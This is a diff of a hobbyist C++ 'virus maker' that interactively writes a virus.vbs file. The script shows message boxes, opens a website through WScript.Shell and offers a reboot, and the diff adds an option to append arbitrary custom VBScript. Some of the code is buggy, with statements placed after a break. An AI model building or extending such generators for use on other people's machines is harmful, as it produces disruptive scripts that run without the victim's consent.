@@ -10,17 +10,20 @@
 
 #define endl "\n"
 #define clearConsole system("clear");
+#define PAUSE system("PAUSE");
 
 void showOptions()
 {
     std::cout << "1. Open other alert" << endl;
-    std::cout << "2. Open WebSite(ONLY CHROME!)" << endl;
+    std::cout << "2. Open website(ONLY CHROME)" << endl;
     std::cout << "3. Reboot PC" << endl;
-    std::cout << "4. End Virus" << endl;
+    std::cout << "4. Custom Script(VBscript)" << endl;
+    std::cout << "5. End Virus" << endl;
 }
 
 void showEnglish()
 {
+    std::cout << "Translated by: CosmoXD and Google Translate xD" << endl;
     std::ofstream virus;
     char nombreVirus[500];
     try
@@ -36,7 +39,7 @@ void showEnglish()
     }
     
 
-    //This part create the virus file
+    // ESTA PARTE CREA EL ARCHIVO DEL VIRUS FINAL
     try
     {
         virus.open("virus.vbs", std::ios::ate);
@@ -47,9 +50,9 @@ void showEnglish()
         std::cout << "ERROR Creating the virus.vbs file!. 0x2" << endl;
     }
 
-    std::cout << "Now select what the virus make now" << endl;
+    std::cout << "Now select what the virus need do:" << endl;
 
-    //This is the "main loop" what write the events
+    //Este es el "main loop" en el cual se escribiran los eventos
     for(int i = 0; i < 1000; i++)
     {
         int option;
@@ -57,7 +60,7 @@ void showEnglish()
         scanf("%i", &option);
         if(option == 1)
         {
-            std::cout << "Please tell me what other message do you want the program to display: ";
+            std::cout << "Please, say me the other message: ";
             char mensaje[500];
             std::cin >> mensaje;
             virus << endl << "msgbox(\"" << mensaje << "\")";
@@ -67,21 +70,11 @@ void showEnglish()
         {
             char abrirWebChrome[] = 
             endl
-            "Option Explicit"
+            "Dim wShell"
             endl
-            "Dim URL,WshShell,i"
+            "Set wShell = CreateObject(\"WScript.Shell\")"
             endl
-            "URL = \"www.google.com\""
-            endl
-            "Set WshShell = CreateObject(\"WScript.shell\")"
-            endl
-            "For i = 0 to 50"
-            endl
-            "WshShell.SendKeys(chr(175))"
-            endl
-            "Next"
-            endl
-            "WshShell.run \"CMD /C start chrome.exe\" & URL & "",0,False"
+            "wShell.Run \"http://google.com\",9"
             endl;
             virus << abrirWebChrome;
             clearConsole
@@ -101,9 +94,26 @@ void showEnglish()
         }
         else if(option == 4)
         {
+            char scriptPersonalizado[1000];
+            std::cout << "Write the custom script:" << endl;
+            std::cout << "NOTE: I am developing a way to make a multiline script, please wait ..." << endl;
+            std::cout << "For now to do that you have to select the custom script option more than once to make a multiline script" << endl;
+            std::cin >> scriptPersonalizado;
+            std::cout << endl;
+            virus << endl << scriptPersonalizado;
+        }
+        else if(option == 5)
+        {
             break;
-            std::cout << "BYE!";
+            virus.close();
             system("PAUSE");
+            std::cout << "BYE!!";
+        }
+        else 
+        {
+            std::cout << "ERROR 0x4." << endl;
+            break;
+            PAUSE
         }
         i++;
     }
